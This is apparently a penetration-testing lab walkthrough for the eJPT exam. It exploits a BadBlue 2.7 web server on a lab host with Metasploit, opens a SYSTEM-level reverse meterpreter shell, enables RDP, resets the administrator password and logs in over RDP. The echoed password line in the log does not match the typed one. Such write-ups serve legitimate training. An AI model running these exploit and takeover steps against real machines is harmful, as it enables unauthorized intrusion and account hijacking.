```jsx
Lab Name: Enabling RDP
Platform: INE
Lab No: 27
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
┌──(root㉿INE)-[~]
└─# ping demo.ine.local
PING demo.ine.local (10.4.16.35) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.16.35): icmp_seq=1 ttl=125 time=12.3 ms
64 bytes from demo.ine.local (10.4.16.35): icmp_seq=2 ttl=125 time=10.5 ms
64 bytes from demo.ine.local (10.4.16.35): icmp_seq=3 ttl=125 time=10.7 ms
^C
--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 10.467/11.161/12.303/0.813 ms
```

## NMAP Scan:

```console
┌──(root㉿INE)-[~]
└─# nmap demo.ine.local -sV -O
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 19:55 IST
Nmap scan report for demo.ine.local (10.4.16.35)
Host is up (0.010s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         BadBlue httpd 2.7
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/19%OT=80%CT=1%CU=43172%PV=Y%DS=3%DC=I%G=Y%TM=66EC
OS:3487%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%
OS:TS=7)OPS(O1=M546NW8ST11%O2=M546NW8ST11%O3=M546NW8NNT11%O4=M546NW8ST11%O5
OS:=M546NW8ST11%O6=M546ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=
OS:2000)ECN(R=Y%DF=Y%T=7F%W=2000%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF
OS:=Y%T=7F%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W
OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=7F%CD=Z)
                                                                                          
Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.24 seconds
```

## Exploitation:

```console
┌──(root㉿INE)-[~]
└─# msfconsole -q
msf6 > search Badblue 2.7

Matching Modules
================

   #  Name                                   Disclosure Date  Rank   Check  Description
   -  ----                                   ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_passthru  2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow
   1    \_ target: BadBlue EE 2.7 Universal  .                .      .      .
   2    \_ target: BadBlue 2.72b Universal   .                .      .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/http/badblue_passthru
After interacting with a module you can manually set a TARGET with set TARGET 'BadBlue 2.72b Universal'

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host
                                       :port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.c
                                       om/docs/using-metasploit/basics/using-metasploit.
                                       html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, proce
                                        ss, none)
   LHOST     10.10.42.5       yes       The listen address (an interface may be specifie
                                        d)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/badblue_passthru) > set RHOST demo.ine.local
RHOST => demo.ine.local
msf6 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.42.5:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (176198 bytes) to 10.4.16.35
[*] Meterpreter session 1 opened (10.10.42.5:4444 -> 10.4.16.35:49234) at 2024-09-19 19:57:53 +0530

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Enabling RDP:

```console
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y. Run the help command for more details.
msf6 exploit(windows/http/badblue_passthru) >
msf6 exploit(windows/http/badblue_passthru) > search enable_rdp

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   0  post/windows/manage/enable_rdp  .                normal  No     Windows Manage Enable Remote Desktop


Interact with a module by name or index. For example info 0, use 0 or use post/windows/manage/enable_rdp

msf6 exploit(windows/http/badblue_passthru) > use 0
msf6 post(windows/manage/enable_rdp) > show options

Module options (post/windows/manage/enable_rdp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ENABLE    true             no        Enable the RDP Service and Firewall Exception.
   FORWARD   false            no        Forward remote port 3389 to local Port.
   LPORT     3389             no        Local port to forward remote connection.
   PASSWORD                   no        Password for the user created.
   SESSION                    yes       The session to run this module on
   USERNAME                   no        The username of the user to create.


View the full module info with the info, or info -d command.

msf6 post(windows/manage/enable_rdp) > set SESSION 1
SESSION => 1
msf6 post(windows/manage/enable_rdp) > run

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[+]     RDP Service Started
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20240919195939_default_10.4.16.35_host.windows.cle_749694.txt
[*] Post module execution completed
```

## Changing Password:

```console
msf6 post(windows/manage/enable_rdp) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 2328 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net user administrator n0tabdu11ah_MNM
net user administrator !abdu11ah
The command completed successfully.
```

## Flag:

```console
┌──(root㉿INE)-[~]
└─# xfreerdp /u:administrator /p:n0tabdu11ah_MNM /v:demo.ine.local           
[20:05:31:686] [3586:3587] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:05:31:687] [3586:3587] [WARN][com.freerdp.crypto] - CN = WIN-OMCNBKR66MN
[20:05:32:792] [3586:3587] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: Asia/Kolkata
[20:05:32:093] [3586:3587] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[20:05:32:093] [3586:3587] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[20:05:32:113] [3586:3587] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[20:05:32:113] [3586:3587] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[20:05:34:982] [3586:3587] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

![image](https://github.com/user-attachments/assets/790ee049-a199-4b2b-87b0-fb8c75a7a15d)

---

![image](https://github.com/user-attachments/assets/ceb67b1c-8a1a-45df-9a0c-3a7ab3fbe621)

---
